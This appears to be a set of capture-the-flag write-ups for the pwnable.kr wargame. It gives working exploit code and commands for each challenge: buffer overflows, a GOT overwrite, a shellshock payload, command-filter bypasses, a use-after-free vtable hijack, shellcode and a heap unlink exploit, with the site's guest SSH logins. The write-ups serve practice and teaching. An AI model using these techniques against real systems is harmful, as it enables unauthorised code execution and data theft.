All the challenge is accessible in pwnablr.kr.

# fd

When the file fd equals to 0, the read() will get string from standard input. So just type `4660` which equals to `0x1234`

# collision
It converts `char*` to `int*`, which means that if we type `./col ABCDEFGHIJKLMNOPQRST`, it will becomes number like `0x44434241 0x47464544 0x51504948 0x54535251 0x58585655`(little endian). Just find appropriate number to crack it.

# bof
Simple Overflow:
```python
from pwn import *
c = remote("pwnable.kr", 9000)
c.sendline('\xbe\xba\xfe\xca'*15)
c.interactive()
```

# passcode
Notice that the value passed to *scanf* is not a pointer and it’s without default value. We can first use `stack(buf[100])` to write the default value and then overwrite GOT table:
```bash
(python -c 'print "0"*96+"\x04\xa0\x04\x08"+"134514135"') | ./passcode
```

# random
The random() in glib is pseudo-random. So, the first value is always `0x6b8b4567`. Just simply brute-force the xor value.

# input
Just use pipe, nano, and nc to give input

# leg
*PC* always points to the next instruction, while *lr* points to the return address. By adding the offset, we can simply can get the result.

# mistake
Let’s first have a look at `fd=open("/home/mistake/password",O_RDONLY,0400) < 0`. Because `<` is prior to `=`, fd will always be 0 while opening a file successfully. `fd=0` means that `read(fd,pw_buf,PW_LEN)` will always read stdin input. We just need to calculate `xor(buf2,10)` and give its result in stdin.
e.g.
```
do not bruteforce...
1111111111
input password : 0000000000
Password OK
```

# shellshock
Google shellshock vulnerability. And get:
```bash
$ export foo='() { echo "aaa"; }; value=$(<flag);echo "$value"'
$ ./shellshock
```

# coin1
Simple math, use binary search is enough

# blackjackk
The code does not check negative value, just type `-100000000` and you will get enough money.

# lotto
```c
for(i=0; i<6; i++){
  for(j=0; j<6; j++){
    if(lotto[i] == submit[j]){
      match++;
    }
  }
}
```

We can type duplicate word to increase the posbility to win, e.g:`,,,,,,`

# cmd1
We have to bypass the restriction of flag, sh, tmp. And the *PATH* is set to /thankyouverymuch. Just use an absolute address to execute command and use `\` escape to bypass strstr: `./cmd1 "/bin/cat < /home/cmd1/fla\g"`

# cmd2
Almost the same as above one: `./cmd2 "read line;exec \$line"`. Then type: `/bin/cat flag`

# uaf
let’s set a break point at *main+286 which is instruction call rdx. We the breakpoint is triggered, let’s reveal the data on stack: 
```
gdb> x/4wx $rbp-0x38:
0x7ffca7f01ee8:	0x02131ea0	0x00000000	0x02131ef0	0x00000000
```

Why x/4wx $rbp-0x38, as the disassemble instruction shown:
```
0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
```

The call rdx is actually call `*(*(*($rbp-0x38))+8)`.

We get *0x02131ea0*, which is the address pointed to Man instance created by new in line `Human* m = new Man("Jack", 25);`

Let’s have a closer look to the pointer: `x/10wx 0x02131ea0`, here is the result:
```
0x2131ea0:	0x00401570	0x00000000	0x00000019	0x00000000
0x19, which is exactly the same as 25. It verifies our assumption!
Therefore, 0x00401570 is the address of vtable.
Now, the call *(*(*($rbp-0x38))+8) = call *(*(0x02131ea0)+8) = call *(0x00401570+8) = call rdx. After examing vtable by x/20wx 0x00401570, we found that:
0x401570 <_ZTV3Man+16>:	0x0040117a	0x00000000	0x004012d2	0x00000000
0x401580 <_ZTV5Human>:	0x00000000	0x00000000	0x004015f0	0x00000000
0x401590 <_ZTV5Human+16>:	0x0040117a	0x00000000	0x00401192	0x00000000
0x4015a0 <_ZTS5Woman>:	0x6d6f5735	0x00006e61	0x00000000	0x00000000
0x4015b0 <_ZTI5Woman>:	0x00602390	0x00000000	0x004015a0	0x00000000
```

And the `x 0x0040117a` is exactly the address of: `0x40117a <_ZN5Human10give_shellEv>: 0xe5894855`

If we call `*(0x401570-8+8)`, we can execute shell on it!

How to? First, we need to create a file which includes our payload: `python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > payload`. Then, run the proram `./uaf 24 payload`. Our fake instance needs to have size 24 to match the original instance’s size. Then, type *3* to delete the original Man and Womaninstance. And type *2* for twice to create two fake instances, which adjusts the vtable the vtable offset to get shell. Although the `m` and `w` is deleted, the pointer still points to the same place of stack, which point to out fake instance. Finally, we type *3* to get shell.

# asm
pwntools can handle it easily:
```python
from pwn import *
con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')
shellcode = shellcraft.amd64.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.amd64.linux.open('rsp',0,0)
shellcode += shellcraft.amd64.linux.read('rax','rsp',0)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 100)
p.recvuntil('shellcode: ')
p.send(asm(shellcode))
log.success(p.recvall())
```

# unlink
Old style hacking. We can use unlink to overwrite the return address of main:
```python
from pwn import *
s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
a = s.process(["./unlink"])
r = a.recvuntil('get shell!\n')
stack_addr = int(r.split('leak: 0x')[1][:8], 16)
heap_addr = int(r.split('leak: 0x')[2][:8], 16)
shell_addr = 0x80484eb
a.send("A"*16 + p32(heap_addr + 0x24) + p32(stack_addr + 0x10) + p32(shell_addr))
a.interactive()
```

# horcruxes
Set the address of function *A*, *B*, *C*, *D*, *E*, *F*, *G* in your ROP chain to leak. After caculation their sum, use ROP to call ropmeand pass sum to get flag.

# blukat
This challenge gives us source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
  int i;
  for(i=0; i<strlen(s); i++){
    flag[i] = s[i] ^ key[i];
  }
  printf("%s\n", flag);
}
int main(){
  FILE* fp = fopen("/home/blukat/password", "r");
  fgets(password, 100, fp);
  char buf[100];
  printf("guess the password!\n");
  fgets(buf, 128, stdin);
  if(!strcmp(password, buf)){
    printf("congrats! here is your flag: ");
    calc_flag(password);
  } else {
    printf("wrong guess!\n");
    exit(0);
  }
  return 0;
}
```

While it has canary check and exit function. It's impossible to use overflow.

# GDB method

I use this method. You can use gdb to debug the program. Set a breakpoint after calling read function and check data in the password varaible. Then, you can retrieve the string and use calc_flag to decrypt it.
```
$ gdb blukat
(gdb) b *main+74
(gdb) r
(gdb) x/s 0x6010a0
```

# Permission method

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
  int i;
  for(i=0; i<strlen(s); i++){
    flag[i] = s[i] ^ key[i];
  }
  printf("%s\n", flag);
}
int main(){
  FILE* fp = fopen("/home/blukat/password", "r");
  fgets(password, 100, fp);
  char buf[100];
  calc_flag(password);
  return 0;
}
```

We can compile another program from *buckat.c* with a little bit modification:
This should be the intended method.